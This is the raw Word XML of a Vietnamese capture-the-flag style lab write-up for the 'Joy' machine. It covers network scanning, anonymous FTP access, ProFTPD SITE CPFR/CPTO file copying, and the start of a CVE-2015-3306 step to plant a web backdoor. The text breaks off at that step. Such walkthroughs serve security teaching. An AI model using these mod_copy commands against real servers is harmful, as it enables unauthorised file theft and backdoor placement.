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A8CAC" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="240"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">13. </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>digialworld</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>.local JOY Enumeration and Exploitation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="18469BD8" w14:textId="59287E6D" w:rsidR="00DB4693" w:rsidRDefault="00DB4693" w:rsidP="00DB4693">
      <w:pPr>
        <w:spacing w:after="240"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="36"/>
        </w:rPr>
        <w:t>Link tải:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E52E614" w14:textId="473B8CDB" w:rsidR="00DB4693" w:rsidRDefault="00DB4693">
      <w:pPr>
        <w:spacing w:after="240"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r w:rsidRPr="00DB4693">
        <w:t>https://drive.google.com/drive/folders/13xmIa_lVQ8Hbw30phswyfslizyrwSOUI</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A53846B" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>1. Mục tiêu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="310BBFEF" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Thực hiện thu thập thông tin, khai thác dịch vụ FTP, tạo kết nối shell và kiểm tra khả năng nâng quyền trên máy mục tiêu Joy trong môi trường thực hành được kiểm soát.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2ACEFD1B" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="30"/>
        </w:rPr>
        <w:t>2. Các bước thực hiện</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61D0C102" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 1. Xác định địa chỉ IP máy mục tiêu</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20895F84" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tìm các thiết bị đang hoạt động trong cùng mạng và xác định địa chỉ IP của máy Joy.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5122131C" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2343EFF1" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>netdiscover -i eth1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0058B111" w14:textId="6F9645E1" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>nmap</w:t>
      </w:r>
      <w:r w:rsidR="00D31387">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> -p-</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> -A 192.168.56.124</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="658D9BB6" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Xác định được IP máy mục tiêu và các dịch vụ, cổng mạng đang mở.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5BB17967" w14:textId="434DA09D" w:rsidR="00134469" w:rsidRDefault="00D31387">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="141786DF" wp14:editId="743FBAE4">
            <wp:extent cx="6152515" cy="2082800"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="1942573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573479" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId6"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2082800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="5895D2DF" w14:textId="508C09B9" w:rsidR="00D31387" w:rsidRDefault="00D31387">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="275DD008" wp14:editId="77EEA2CF">
            <wp:extent cx="6152515" cy="4111625"/>
            <wp:effectExtent l="0" t="0" r="635" b="3175"/>
            <wp:docPr id="180443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3406" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId7"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="4111625"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="428B52CA" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="75F3D836" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="26BA7EBD" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="5B9CDA85" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 2. Đăng nhập FTP bằng tài khoản anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2B78138F" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Kiểm tra khả năng truy cập FTP ẩn danh và tải tệp trong thư mục upload.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3893165D" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7DCDB736" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ftp 192.168.56.124</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="57FA931E" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="42EAD385" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>cd upload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45C16531" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>get directory</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2753D468" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>quit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="560857D2" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>cat direcotry</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="191DFC6B" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Truy cập được FTP bằng anonymous, tải tệp directory về máy Kali và đọc nội dung tệp.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2E694247" w14:textId="63094BDD" w:rsidR="00134469" w:rsidRDefault="00D31387">
      <w:pPr>
        <w:spacing w:before="80" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="76B04116" wp14:editId="129D88B3">
            <wp:extent cx="6152515" cy="4822825"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="25552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52435" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId8"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="4822825"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="402F93C6" w14:textId="3905DBC4" w:rsidR="00D31387" w:rsidRDefault="00D31387">
      <w:pPr>
        <w:spacing w:before="80" w:after="40"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="30CCD169" wp14:editId="46BD0956">
            <wp:extent cx="6152515" cy="3663315"/>
            <wp:effectExtent l="0" t="0" r="635" b="0"/>
            <wp:docPr id="2038385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85723" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId9"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3663315"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="17207A7B" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="54078E9C" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="40F6CCEA" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="57200978" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="03181FFB" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 3. Sao chép tệp version_control qua FTP</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4F8F9C6D" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Lợi dụng lệnh SITE CPFR/CPTO của dịch vụ FTP để sao chép tệp version_control vào thư mục FTP có thể tải xuống.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5370DCF0" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2BD8BDC7" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>telnet</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t xml:space="preserve"> 192.168.56.124 21</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="34F545EC" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>site cpfr /home/patrick/version_control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40884547" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>site cpto /home/ftp/upload/version_control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46D686C4" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>quit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFCDC1B" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tệp version_control được sao chép vào thư mục /home/ftp/upload/.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2505AF7A" w14:textId="29825738" w:rsidR="00134469" w:rsidRDefault="00D31387">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="0858D7B0" wp14:editId="53573455">
            <wp:extent cx="5695950" cy="2209800"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="367025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25116" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId10"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="5695950" cy="2209800"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="66299936" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="64E787CE" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="2151C5DA" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="591FF1C5" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 4. Tải tệp version_control về Kali</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="398AE789" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Thu thập nội dung tệp cấu hình để phục vụ bước khai thác tiếp theo.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20E14BDD" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Câu lệnh:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7E280FA2" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ftp 192.168.56.124</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="61ECBC73" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>anonymous</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="520678B2" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>cd upload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5D51143D" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>ls</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A823E42" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>get version_control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="419B1223" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="20"/>
        <w:ind w:left="397"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>exit</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7513B056" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t xml:space="preserve">Kết quả: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Tải thành công tệp version_control về máy Kali.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="11D02067" w14:textId="56143AA0" w:rsidR="00134469" w:rsidRDefault="00D84A91">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="6119DD6C" wp14:editId="3FBA4A3D">
            <wp:extent cx="6152515" cy="3940810"/>
            <wp:effectExtent l="0" t="0" r="635" b="2540"/>
            <wp:docPr id="2023525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525508" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId11"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="3940810"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="7C3FC1B4" w14:textId="4FBDBAFF" w:rsidR="00D84A91" w:rsidRDefault="00D84A91">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="3CBBB5CF" wp14:editId="39D8F8F8">
            <wp:extent cx="6152515" cy="2032000"/>
            <wp:effectExtent l="0" t="0" r="635" b="6350"/>
            <wp:docPr id="2134550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550886" name=""/>
                    <pic:cNvPicPr/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId12"/>
                    <a:stretch>
                      <a:fillRect/>
                    </a:stretch>
                  </pic:blipFill>
                  <pic:spPr>
                    <a:xfrm>
                      <a:off x="0" y="0"/>
                      <a:ext cx="6152515" cy="2032000"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="08B6CEBA" w14:textId="32356E16" w:rsidR="00D84A91" w:rsidRDefault="00D84A91"/>
    <w:p w14:paraId="7877BD6C" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="24AAC64E" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="468671BB" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00134469"/>
    <w:p w14:paraId="2EC5F325" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:before="160" w:after="80"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Bước 5. Khai thác CVE-2015-3306</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B0D8E9B" w14:textId="77777777" w:rsidR="00134469" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">Mục đích: </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="000000"/>
        </w:rPr>
        <w:t>Sử dụng mã khai thác đối với ProFTPD mod_copy để đưa tệp backdoor vào thư mục web.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1BD7BFD0" w14:textId="3EE63E5E" w:rsidR="00D84A91" w:rsidRDefault="00000000">
      <w:pPr>
        <w:spacing w:after="60"/>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:color w:val="000000"/>
